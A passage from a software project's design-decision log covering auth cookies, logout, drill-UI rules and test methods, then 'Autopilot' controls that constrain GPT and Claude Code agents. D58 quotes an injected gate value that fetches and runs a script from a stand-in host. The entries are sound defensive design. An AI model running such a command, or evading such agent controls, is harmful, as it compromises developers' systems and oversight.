`__Host-`, `SameSite=Lax` cookie that lives ten minutes. The contract is amended
to the implementation rather than the reverse, and the reasoning is the point.
Sealing defends only against an attacker who can READ the cookie — and HttpOnly
excludes script, while Secure and `__Host-` exclude the network, other origins
and subdomains. What remains is device-level compromise, where the far more
valuable session cookie is equally exposed. The contents are not sensitive:
`state` exists to be compared for equality, and the verifier is a one-time
secret bound to a single short-lived `code`. Forging one is excluded by
`__Host-`, and would still have to match the provider's echoed `state`.
D39 cuts both ways: do not hand-roll session crypto, and do not add crypto that
defends against nothing. **This expires** if the challenge ever carries
identifying data — an email, a tenant hint, a user-bearing return payload — at
which point it must be sealed.

## D46 — Logout is Apsis's, not the provider's
(2026-09-16) Final review found the adapter reading
`provider ? provider.logout(request) : unconfigured()`, so with WorkOS
unconfigured the whole route changed shape: `GET` answered 302 instead of 405,
and a legitimate `POST` could not clear the local cookie at all. A stale session
could sit in a browser through a configuration outage and become usable again
the moment configuration returned.
Not an authentication bypass — `/api/interpret` fails closed — but it made an
explicit user action depend on a vendor being reachable, and "sign me out" is
precisely the action that must not.
The HTTP semantics now live in `server/auth/logout.ts` and are
provider-independent: method enforcement, the same-origin check (through the
shared `sameOrigin`, not a copy), and clearing the local cookie all happen
whether or not a provider exists. The WorkOS adapter contributes only
`logoutUrl()` — a URL or `null` — and may throw, in which case the local session
still ends. Nothing is mutated until both guards pass, so a rejected request
leaves the browser exactly as it found it.
The general rule: **a local security action must not be gated on a remote
dependency.** The vendor half is best-effort; the local half is not.
Forbids: an adapter that changes a route's status semantics based on
configuration; logout logic in `api/`.

## D47 — A 403 is positive evidence of a session
(2026-09-16) The client treated `forbidden` as "change nothing", so a stale
`signed-out` state survived a 403 and left a user who genuinely was signed in
staring at a "Sign in" link that could not help them.
A 403 means the server authenticated the request and then refused the
capability — it PROVES an identity exists. It now corrects the local state to
signed-in, while still never asking the user to sign in. `unavailable` remains
the opposite case: no evidence either way, so a known signed-in state is
preserved and anything else becomes "cannot say".
The distinction worth keeping: 401 is evidence of no session, 403 is evidence of
a session, and 503 is evidence of nothing at all.
Forbids: treating an authorization failure as ambiguous about authentication.

## D48 — Choose the next grouping, not a report
(2026-09-16) Dynamic drill dimensions contract. Nine dimensions are registered
and four are reachable; the picker exposes the rest by making the heading the
overlay ALREADY renders — "Drill into city" — a control.
Presets were rejected: they need a named library to maintain, add a second
concept ("which analysis am I in?") before the user has asked for one, and a
nearly-right preset still needs per-level control. A preset list is the first
step toward the BI dashboard this product is not.
What makes per-level choice safe rather than confusing is that **the default
chain is pre-selected at every depth**. `DRILL_SEQUENCE` survives, demoted from
"the drill order" to "the default suggestion at each depth" — that demotion is
the entire architectural change, and it is why a user who never opens the picker
sees today's screen.
Forbids: preset sequences; any second way to configure a drill; a picker that is
open, focused or visible by default.

## D49 — A dimension is offered only if it can split the cluster
(2026-09-16) One rule replaces three. The picker offers a dimension when it
yields ≥2 distinct keys among the current members, and hides it otherwise.
That single test subsumes every case: a repeated dimension yields one child, so
repeats become impossible without a "used" set; `region` after `state` yields one
child, so **geography needs no special-casing** and none is added; and a
dimension where every member happens to share a value is hidden because offering
a control that provably changes nothing is noise.
Ordering is default-first then registry order — never by child count, because a
list that reorders itself as the feed lands is a list nobody can build muscle
memory for. Computed when the picker OPENS, with an early exit per dimension at
the second distinct key: a menu computes its contents when summoned, not on
every revision for a menu nobody opened.
Forbids: a hardcoded dimension-compatibility table; reordering the picker by
live counts; computing availability per frame or per revision.

## D50 — Drill depth is a constant, not the length of the default sequence
(2026-09-16) `MAX_DRILL_DEPTH = 4`. Three files read `DRILL_SEQUENCE.length` to
decide when individual focus becomes available — `drillStore`,
`SelectedLeadFocus`, `CameraRig` — which silently coupled §14's behaviour to the
default path's length. With dynamic dimensions that coupling is wrong in
principle even while the numbers agree, so it is made explicit.
Rejected: a user-selected terminal "Leads" step (a second control and a second
way to be at the bottom) and depth-when-the-cluster-is-small — the latter would
make `isIndividualFocus` depend on the book, and it is read PER FRAME, so focus
would flicker as the feed changed a child count and a pure `(lead, path)`
predicate would become impure.
Forbids: unlimited recursive drilling; making focus depth data-dependent.

## D51 — A live path is reported, never rewritten
(2026-09-16) Agent ownership changes on every event, `timeframe` buckets move
with the wall clock, and `temperature` follows `stage` — so a path the user
chose can shrink or empty while they are looking at it.
Apsis never auto-pops, never substitutes a key, and never silently rewrites the
path. An empty cluster keeps its breadcrumb and says so, with the existing Back
control as the way out. The roster already renders "No leads in this cluster"
and focus already dissolves on the membership test, so the honest behaviour is
mostly free.
Related and deliberate: the drill path is NOT persisted. Persistence v1 is a
canonical event log replayed through `ingest` (D23); a drill path is neither an
event nor domain state, and a restored `timeframe · Today` is empty by the next
morning — so a returning user's first sight would be an empty cluster they did
not choose. Persisting something merely because a persistence layer exists is
the failure this policy names.
Forbids: auto-popping or rewriting a drill path as the book changes; persisting
navigation state.

## D52 — One function resolves the next grouping, and it may resolve past a default
(2026-09-16) Contract revision. Resolving `nextDimensionId === null` straight to
`DRILL_SEQUENCE[path.length]` is wrong after a dynamic path: `Agent → Timeframe
→ Segment` leaves a depth whose raw default `segment` is already used, and
`City` at depth 0 leaves a depth whose raw default `state` is already determined
by the city. Both yield one child, which violates D49 while the heading
cheerfully announces the dimension.
`effectiveNextDimension` is the single source of truth: terminal → available →
still-available selection → depth default if available → first available in
registry order. The heading, the picker's active state and `clusterChildren` all
read it, and it returns the availability list it used so the menu cannot be
computed twice and disagree.
Resolving past an unusable default is NOT rewriting history: `path` is
untouched, and a superseded selection is cleared by the next navigation anyway.
Forbids: deriving the next dimension in more than one place; resolving to a
dimension that cannot split the current cluster.

## D53 — availableDimensions traverses its iterable exactly once
(2026-09-16) Production calls it with `leads.values()` — a Map iterator, which
is **single-pass**. The obvious implementation, `for (dimension) for (lead)`,
would let only the first dimension see the book and silently report every other
as unavailable; the symptom would be a picker that only ever offers `region`,
with nothing in the code looking wrong.
Required shape: one pass over the iterable with every dimension advanced
together, retaining at most two distinct keys per dimension and dropping a
dimension's key set the moment it is proven splittable. O(members × dimensions)
with bounded tiny memory. A unit test passes a deliberately one-shot generator,
which a multi-pass implementation fails immediately.
Forbids: iterating a supplied `Iterable` more than once anywhere in this code
path.

## D54 — The roster cap was re-measured, and the old guarantee is withdrawn
(2026-09-16) Progressive reveal recorded that a full-depth cluster never exceeds
81 members, so `VISIBLE_CAP = 150` could not truncate one. That was measured for
the FIXED default sequence. Dynamic paths change the question, so it was
re-measured rather than assumed: every reachable four-step path on the
deterministic 4,892-lead book was enumerated under the availability rules.
**The maximum terminal cluster is 266** — `Region · Northeast → State · New York
→ City · New York, NY → Temperature · Cold` — with 28 terminals over 150 on a
fresh book (32 once ownership exists; the maximum is unchanged, because `agent`
only adds narrower paths).
So the guarantee is false and this project does not repeat it. The cap stays,
because raising it buys a number rather than a guarantee (a 60k book truncates
again) and lifting it at terminal depth trades a truthful label for a DOM
problem at ~3,200 rows. "Fully accessible" is redefined against the mechanism
that actually exists and was verified in the code: **the in-cluster search
needle is applied BEFORE the cap**, so a member ranked 200th by score is one
keystroke away, and the header already says `showing 150 of 266 · narrow the
drill or search`.
`LeadList.tsx` therefore stays forbidden — on evidence, not on the withdrawn
assumption. A regression test pins the measured 266 so a change to the book, the
dimensions or the rules re-opens this decision instead of drifting past it.
Forbids: repeating the "every full-depth member is listed" claim; weakening the
truthful count language; adding virtualisation to solve a case search solves.

## D55 — The default next grouping is positional, not relative
(2026-09-16) Dynamic drill dimensions implemented. `DRILL_SEQUENCE[path.length]`
is consulted by depth, so after a dynamic first step — `Segment · Medicare` —
depth 1 still defaults to `state`, not to `region`. The chain does not restart.
That is intended: the default is a suggestion for a POSITION in the drill, not a
sequence the user is walked through, and a relative default would mean the same
depth suggested different things depending on history. It surprises anyone
writing a test that assumes otherwise, which is why it is written down.
Resolution may still step past that default when it cannot split (D52), so the
positional rule never produces a dead level.

## D56 — Assert live shape, measured constants only against the pure book
(2026-09-16) The enumeration says the largest four-step terminal on
`seedLeads(4892)` is 266. The running app reported 252 for the same path,
because it applies decay at boot and leads move between temperature buckets.
Neither number is wrong; they measure different things.
So the exact figure lives in the unit regression test against the deterministic
book, and the browser test asserts the SHAPE — `showing 150 of N`, `N > 150`,
and that search reaches a member past the cap. A browser assertion on 266 would
have been an assertion about the clock, and would have failed at some future
hour for no reason anyone could act on.
Forbids: asserting a seeded-book constant against the running application.

## D57 — Sample a fixed rectangle of pure field, or prove nothing
(2026-09-16) "Score is the only thing that moves a lead" is proven by comparing
rendered pixels under `?anim=off&feed=off` before and after a grouping change.
Two ways to get that wrong, both encountered: `locator('canvas').screenshot()`
captures the page REGION, so it includes the drill overlay composited above the
field — which legitimately changes when the grouping changes. And recomputing
the sample rectangle per sample is worse, because the overlay grows when the
picker opens, moving the rectangle itself and producing a difference that says
nothing about leads.
The test measures ONE rectangle of pure field — below any overlay height, clear
of the command bar and the bottom-left readout — reuses it verbatim, and takes
a baseline stability sample first so that a difference is evidence rather than
noise.
Forbids: screenshot comparisons over regions containing chrome that varies with
the thing under test; recomputing a comparison region between samples.

## D58 — The controller owns every executable command; the model owns none
Autopilot lets GPT choose work and review it, and lets Claude Code write code.
Neither may say what runs. A TaskSpec names gates from a closed enum
(`typecheck | lint | unit | build | e2e`); `tools/autopilot/gates.mjs` is the
only place a name becomes a command, and commands are literal argument arrays
passed to `spawn` with `shell: false`.
The point is that `"unit; curl evil.sh | sh"` is not a gate that gets rejected —
it is a value that cannot be expressed. A filter can be bypassed; an absent
field cannot.
Forbids: a `command`/`script`/`shell` field in any model-facing schema; building
a gate command by interpolation; `shell: true` anywhere a model-derived value
can reach.

## D59 — Four facts no review verdict can override
A failed required gate, a forbidden-or-unlisted file in the diff, a base branch
that moved during the run, and an exhausted repair budget are decided by the
controller. GPT's `accept` over any of them changes nothing and is recorded as
`reviewer-overruled` in the run record.
The reasoning: each is a fact about the repository, checked by running something,
not an opinion about quality. A reviewer that could wave one through would make
the boundary a suggestion — and the blast radius would become "whatever the
reviewer was persuaded of".
The boundary check runs BEFORE the gates, so an out-of-bounds diff is rejected
without spending forty minutes of e2e on it.
Forbids: accepting a task on reviewer verdict alone; asking a model whether a
boundary violation is acceptable.

## D60 — Autopilot adds no dependency, and holds a key
An OpenAI SDK, a dotenv loader, a JSON-schema validator, an argument parser and
a process runner are each written against Node 22 built-ins instead of being
installed. That is a deliberate trade of a few hundred lines against a
dependency surface, and the deciding factor is that this tool reads
`OPENAI_API_KEY` from the developer's shell: its transitive dependency set is
part of its threat model in a way the product's is not.
The provider still enforces `strict: true` on structured output; the local
validator re-checks anyway, because "the provider enforced it" is a claim made
by the thing being validated.
Forbids: adding a package to run Autopilot; trusting provider-side schema
enforcement as the only validation; a `VITE_`-prefixed Autopilot variable.

## D61 — Autonomy inside a worktree, approval at the boundary
A run creates a branch and a git worktree from an exact base commit, the worker
never commits, the controller commits once after gates and review pass, and the
run ends by PRINTING a merge command. v1 does not merge and does not push
without `--push-branch` — which itself refuses any branch outside `autopilot/`.
The git surface is a short list with no force push, no reset, no rebase and no
branch delete: absent rather than guarded, the same argument as D38's dev auth
bypass. A capability that is not in the graph cannot be reached by a bug, an
injection, or a future edit that forgets why the guard existed.
Forbids: an automatic merge to main; `--force` in any form; deleting anything
outside `.apsis-autopilot/`; a worker that commits.

## D62 — No child process inherits the owner's credentials
Both spawns used `env: process.env`, so the Claude worker received
`OPENAI_API_KEY` and every gate could read it from a test file a model had just
written. Autopilot's premise is that two providers do different jobs behind a
controller; handing one provider's key to the other's process dissolves that by
inheritance, silently, with nothing in the code saying so. It was never only
about OpenAI — the owner's shell also holds `GITHUB_TOKEN`, `WORKOS_API_KEY`,
npm auth and AWS credentials.
`tools/autopilot/child-env.mjs` denies by NAME (secret-shaped), then by VALUE
(credential-shaped, or byte-identical to one of this process's own secrets, which
catches a format nobody here has heard of). Ordinary environment survives —
`PATH`, `HOME`, `NODE_OPTIONS`, `SSH_AUTH_SOCK` (a socket path, exempt by name) —
because a gate still has to run. Only NAMES are ever returned or recorded.
Deny-list rather than allow-list: an allow-list of environment variables is how
you discover in production that npm needed a cache path. The population being
protected is credentials, which a name-and-value filter describes well.
v1 assumes Claude Code's normal stored login. One narrowly named opt-in,
`APSIS_AUTOPILOT_PASS_ANTHROPIC_KEY=1`, re-admits `ANTHROPIC_API_KEY` and
nothing else.
Forbids: `env: process.env` on any spawn; passing a credential to a worker or a
gate; putting a removed VALUE in a log or a run record.

## D63 — The worker's tool surface is stated, not inherited
`--permission-mode acceptEdits` decides how prompts are answered, not which
tools exist. Which tools existed was coming from the owner's own Claude Code
settings, so a developer who had reasonably allowed `Bash(git *)` for
interactive work was silently granting it to an unattended worker.
The invocation now pins `--tools Read,Edit,Write,Glob,Grep`,
`--disallowed-tools Bash,WebFetch,WebSearch,Task`, `--setting-sources project`
(not the owner's `user`/`local` settings) and `--strict-mcp-config` with no MCP
config, which means no MCP servers at all. `bypassPermissions` throws.
**The worker has no shell in v1.** The cost is real: it cannot run one test in a
tight loop and must reason from the code, learning what failed only on a repair
turn from the controller's real gate output. The purchase is being able to say
plainly, before a first unattended run, that the coding agent cannot execute
arbitrary commands.
Forbids: depending on any Claude settings file Autopilot does not own; granting
the worker Bash; `bypassPermissions`; `--dangerously-skip-permissions`.

## D64 — Assert on raw text, then redact — never the reverse
`context.mjs` read `assertNoSecrets(redact(packet))`. Redaction removes the
secret, so the assertion inspected text that could not contain one and therefore
always passed. The stated invariant — abort rather than scrub and continue — was
inverted by its own implementation: a leaked key would have been quietly
replaced with `[REDACTED]` and sent onward, with the packet-builder bug that read
it still in place and now invisible.
Order is now: build RAW → `assertNoSecrets(raw)` → `redact` → send. The three
prompt builders (`context`, `reviewer`, `worker-prompt`) return raw text for
exactly this reason; the controller asserts and redacts at the boundary. Output
and run-record redaction is unchanged — that is a different direction and still
scrubs.
Forbids: redacting before a secret assertion; a prompt builder that pre-scrubs
its own output.

## D65 — An unread file is not a reviewed file
New files reached the reviewer as `(new file, contents not inlined)`, so a task
whose entire implementation was one new module produced a review in which Astra
accepted code it had never seen — recorded as "reviewed".
`reviewDiff` now inlines untracked text files as new-file hunks read from disk
(nothing is staged; `git add` to produce a diff would mutate the index of a tree
the controller has not accepted). Binary files and files over the byte budget are
NOT summarised into acceptability: they come back in `unreviewable`, the packet
tells the reviewer explicitly what it has not seen, and the controller escalates
regardless of the verdict.
Forbids: describing a file as reviewed when its contents were not in the packet;
staging to produce a diff; silent truncation.

## D66 — Three boundary checks, because gates run code
The order was worker → boundary → gates → review → `git add -A`. A gate RUNS
repository code: a build writes output, a test can write a fixture, a tool drops
a cache. So the surface checked was not the surface committed, and anything
appearing in between entered the branch with no verdict from anyone.
The boundary is now checked after the worker, **after the gates**, and
immediately before the commit — plus a set comparison proving the committed
surface is the one the reviewer actually read (`surface-drift`). Review is not
even requested for an out-of-bounds diff: spending a call to obtain an opinion
the controller must ignore would also put the reviewer in the position of
appearing to bless something it cannot.
Relatedly: a real `run` requires `APSIS_AUTOPILOT_WORKER_BUDGET_USD` and has no
default. The loop count bounds how many turns happen, not what a turn costs.
Inventing a number would be pretending to know what a task of unknown size costs
on the owner's plan; requiring one costs a single variable and makes the ceiling
a decision. `plan` and `dry-run` never ask, because they never invoke a worker.
Forbids: committing a surface no boundary check has seen; a default worker
budget; asking the reviewer about a diff that is already refused.

## D67 — v1 is supervised, and the docs say so
Autopilot constrains git, the file surface, secrets and the worker's tools. It
does NOT sandbox execution: the gates run `npm test` and `npm run build`, which
execute a test file and a build config that a model may have just written, as
the owner's user, with filesystem and network access. Stripping credentials from
that environment reduces what it can reach; it does not stop it running. And the
worker can write any file inside its worktree — the boundary check is detection,
not prevention.
So the policy and README say plainly: v1 is for supervised use on a trusted
repository, and **unattended autonomy requires a stronger execution sandbox or an
isolated runner first**, which is separate work and is not attempted here.
The Autopilot suite also runs in CI now, before the browser stage, needing no
credential and no network — a controller that enforces boundaries is exactly the
kind of code that must not drift untested.
Forbids: describing v1 as sandboxed or container-isolated; running it unattended
on a repository the owner does not trust; a CI configuration that omits
`autopilot:test`.
